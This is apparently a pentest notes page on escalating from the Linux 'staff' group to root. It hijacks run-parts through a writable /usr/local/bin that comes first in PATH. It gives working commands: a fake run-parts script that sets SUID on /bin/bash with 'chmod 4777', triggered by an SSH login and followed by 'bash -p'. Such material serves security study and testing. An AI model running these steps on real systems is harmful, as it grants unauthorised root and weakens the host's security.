---
description: Linux staff group, allows users to add local modifications to the system.
---

# Linux Staff group

Allows users to add local modifications to the system (/usr/local) without needing root privileges (note that executables in /usr/local/bin are in the PATH variable of any user, and they may "override" the executables in /bin and /usr/bin with the same name).&#x20;

As staff its possible to write to `/usr/local/bin` and `/usr/local/sbin`

{% hint style="info" %}
In debian distributions, `$PATH` variable show that `/usr/local/` will be run as the highest priority, whether you are a privileged user or not.
{% endhint %}

### Staff group privilege escalation

To escalate privileges using staff group privileges we create a script and set permissions for /bin/bash to full read, write and execute for owner, group and everyone else using `chmod 4777`.

```bash
# Create a run-parts script
$ nano /usr/local/bin/run-parts

#! /bin/bash
chmod 4777 /bin/bash
```

Make the file executable

```bash
chmod +x /usr/local/bin/run-parts
```

Then start a new ssh connection to trigger run-parts

```bash
# Run bash in privileged mode as root
$ /bin/bash -p 
```

### What is run-parts?

{% hint style="info" %}
The `run-parts` command in Linux is a script used to run all executable files in a specified directory.
{% endhint %}

It’s used for managing and running scripts in directories like `/etc/cron.daily`, `/etc/cron.weekly`, and `/etc/cron.hourly`, which are used for scheduled tasks.

Using `run-parts` program to get root is possible, because most programs will run `run-parts` like with ssh-login and crontab.&#x20;
